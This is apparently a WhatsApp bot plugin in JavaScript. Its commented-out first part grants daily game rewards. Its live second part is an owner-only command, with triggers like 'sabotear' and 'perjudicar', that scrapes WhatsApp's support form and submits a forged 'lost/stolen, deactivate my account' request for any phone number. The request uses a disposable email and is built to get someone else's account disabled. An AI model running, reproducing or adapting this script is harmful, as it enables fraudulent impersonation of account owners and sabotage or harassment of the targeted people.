/*let handler = async (m, { isPrems, conn }) => {
let time = global.db.data.users[m.sender].lastcofre + 0 // 36000000 10 Horas //86400000 24 Horas
if (new Date - global.db.data.users[m.sender].lastcofre < 0) throw `[❗𝐈𝐍𝐅𝐎❗] 𝚈𝙰 𝚁𝙴𝙲𝙻𝙰𝙼𝙰𝚂𝚃𝙴 𝚃𝚄 𝙲𝙾𝙵𝚁𝙴\𝚗𝚅𝚄𝙴𝙻𝚅𝙴 𝙴𝙽 *${msToTime(time - new Date())}* 𝙿𝙰𝚁𝙰 𝚅𝙾𝙻𝚅𝙴𝚁 𝙰 𝚁𝙴𝙲𝙻𝙰𝙼𝙰𝚁`

let img = 'https://telegra.ph/file/ec539ab0fee550fcaf3b2.png'
let dia = Math.floor(Math.random() * 30)
let tok = Math.floor(Math.random() * 10)
let hadesb = Math.floor(Math.random() * 4000)
let expp = Math.floor(Math.random() * 5000)

  global.db.data.users[m.sender].limit += dia
  global.db.data.users[m.sender].money += hadesb
  global.db.data.users[m.sender].joincount += tok
  global.db.data.users[m.sender].exp += expp

let texto = `*𝑹𝒆𝒂𝒍 𝑨𝒔𝒕𝒂 𝑳𝒂 𝑴𝒖𝒆𝒓𝒕𝒆 𝑩𝒆𝒃𝒆 🍓*`

const fkontak = {
        "key": {
    "participants":"0@s.whatsapp.net",
                "remoteJid": "status@broadcast",
                "fromMe": false,
                "id": "Halo"
        },
        "message": {
                "contactMessage": {
                        "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:y\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
                }
        },
        "participant": "0@s.whatsapp.net"
}
await conn.sendFile(m.chat, img, 'hades.jpg', texto, fkontak)
//await conn.sendButton(m.chat, texto, wm, img, [['🔰 𝙼𝙴𝙽𝚄', '/menu'] ], fkontak, m)  
global.db.data.users[m.sender].lastcofre = new Date * 1
}
handler.help = ['daily']
handler.tags = ['xp']
handler.command = ['anuel', 'realastalamuerte', 'noviokarol'] 
handler.register = true
export default handler

function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]}

function msToTime(duration) {
  var milliseconds = parseInt((duration % 1000) / 100),
    seconds = Math.floor((duration / 1000) % 60),
    minutes = Math.floor((duration / (1000 * 60)) % 60),
    hours = Math.floor((duration / (1000 * 60 * 60)) % 24)

  hours = (hours < 10) ? "0" + hours : hours
  minutes = (minutes < 10) ? "0" + minutes : minutes
  seconds = (seconds < 10) ? "0" + seconds : seconds

  return hours + " Horas " + minutes + " Minutos"
}*/

import cheerio from "cheerio"
import axios from "axios"
import util from 'util'
let handler = async (m, { conn, isOwner, usedPrefix, command, args }) => {
const q = args.join(" ")    
if (!q || !args[0]) throw '[⁉️] ¿𝗗𝘂𝗹𝗰𝗲 𝗼 𝘁𝗿𝗮𝘃𝗲𝘀𝘂𝗿𝗮?,𝗜𝗻𝗴𝗿𝗲𝘀𝗲 𝗲𝗹 𝗻𝘂𝗺𝗲𝗿𝗼 𝗮 𝗺𝗮𝗻𝗶𝗽𝘂𝗹𝗮𝗿 𝗲𝗻 𝗺𝗼𝗱𝗼 𝗱𝗲 𝗳𝗼𝗿𝗺𝗮𝘁𝗼 𝗶𝗻𝘁𝗲𝗿𝗻𝗮𝗰𝗶𝗼𝗻𝗮𝗹, 𝐄𝗷𝗲𝗺𝗽𝗹𝗼: +1 (890) 555-555'
let ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")
let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta: " + q)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axios({ url, method: "POST", data: form, headers: { cookie } })
var payload = String(res.data)
if (payload.includes(`"payload":true`)) {
m.reply(`❕𝗗𝗘𝗦𝗔𝗖𝗧𝗜𝗩𝗔𝗡𝗗𝗢❕\n\n##- WhatsApp Support -##\n\nHola,\n\nGracias por tu mensaje.\n\nHemos desactivado tu cuenta de WhatsApp. Esto significa que su cuenta esta¡ deshabilitada temporalmente y se eliminara¡ automaticamente en 30 di­as si no vuelve a registrar la cuenta. Tenga en cuenta: el equipo de atencion al cliente de WhatsApp no puede eliminar su cuenta manualmente.\n\nDurante el periodo de cierre:\n  Es posible que sus contactos en WhatsApp aunn vean su nombre y foto de perfil.\n  Cualquier mensaje que sus contactos puedan enviar a la cuenta permanecera¡ en estado pendiente por hasta 30 di­as.\n\nSi desea recuperar su cuenta, vuelva a registrar su cuenta lo antes posible.\nVuelva a registrar su cuenta ingresando el codigo de 6 digitos, el codigo que recibe por SMS o llamada telefonica. Si te vuelves a registrar\n\nSi tiene alguna otra pregunta o inquietud, no dude en ponerse en contacto con nosotros. Estaremos encantados de ayudar!`)
} else if (payload.includes(`"payload":false`)) {
m.reply(`❗𝗜𝗡𝗙𝗢❗\n\n##- WhatsApp Support -##\n\nHola:\n\nGracias por tu mensaje.\n\nPara proceder con tu solicitud, necesitamos que verifiques que este numero de telefono te pertenece. Por favor, envianos documentacion que nos permita verificar que el numero es de tu propiedad, como una copia de la factura telefonica o el contrato de servicio.\n\nPor favor, asegurate de ingresar tu numero de telefono en formato internacional completo. Para obtener mas informacion sobre el formato internacional, consulta este articulo.\n\nSi tienes alguna otra pregunta o inquietud, no dudes en contactarnos. Estaremos encantados de ayudarte.`)
} else m.reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
handler.tags = ['owner']
handler.command = /^(whatsappsp|orden|sabotear|perjudicar|desactivar|manipular|protocolo|alterar)$/i
handler.rowner = true 
export default handler